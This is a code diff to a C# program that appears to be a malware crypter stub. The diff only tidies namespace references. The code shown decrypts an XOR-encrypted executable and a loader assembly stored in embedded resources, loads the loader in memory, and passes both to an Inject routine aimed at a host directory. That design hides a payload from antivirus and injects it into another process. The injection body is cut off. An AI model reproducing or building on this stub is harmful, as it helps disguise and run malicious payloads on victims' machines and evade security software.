@@ -1,5 +1,4 @@
 using System;
-using System.Windows.Forms;
 using System.Resources;
 using System.Reflection;
 
@@ -16,7 +15,7 @@ static class Program
 {
     static void Main()
     {
-        System.Resources.ResourceManager resMan = new System.Resources.ResourceManager(Options.resFileName, System.Reflection.Assembly.GetExecutingAssembly());
+        ResourceManager resMan = new ResourceManager(Options.resFileName, Assembly.GetExecutingAssembly());
 
         Byte[] encKey = Convert.FromBase64String(Options.encryptionKey);
         byte[] decPE = GetDecryptedPE(resMan, encKey);
@@ -25,14 +24,14 @@ static class Program
         Inject(decPE, decLoader, Options.hostDir);
     }
 
-    private static byte[] GetDecryptedPE(System.Resources.ResourceManager resMan, Byte[] encKey)
+    private static byte[] GetDecryptedPE(ResourceManager resMan, Byte[] encKey)
     {
         byte[] encPE = (byte[])resMan.GetObject(Options.resPayloadName);
         byte[] decPE = Xor(encPE, encKey);
         return decPE;
     }
 
-    private static byte[] GetDecryptedLoader(System.Resources.ResourceManager resMan, Byte[] encKey)
+    private static byte[] GetDecryptedLoader(ResourceManager resMan, Byte[] encKey)
     {
         byte[] encLoader = (byte[])resMan.GetObject(Options.resLoaderName);
         byte[] decLoader = Xor(encLoader, encKey);
@@ -41,7 +40,7 @@ static class Program
 
     private static void Inject(byte[] decPE, byte[] decLoader, string hostDir)
     {
-        System.Reflection.Assembly loaderDLL = System.Reflection.Assembly.Load(decLoader);
+        Assembly loaderDLL = Assembly.Load(decLoader);
 
         Type loaderType = loaderDLL.GetType("Loader");
         Object loader = Activator.CreateInstance(loaderType);
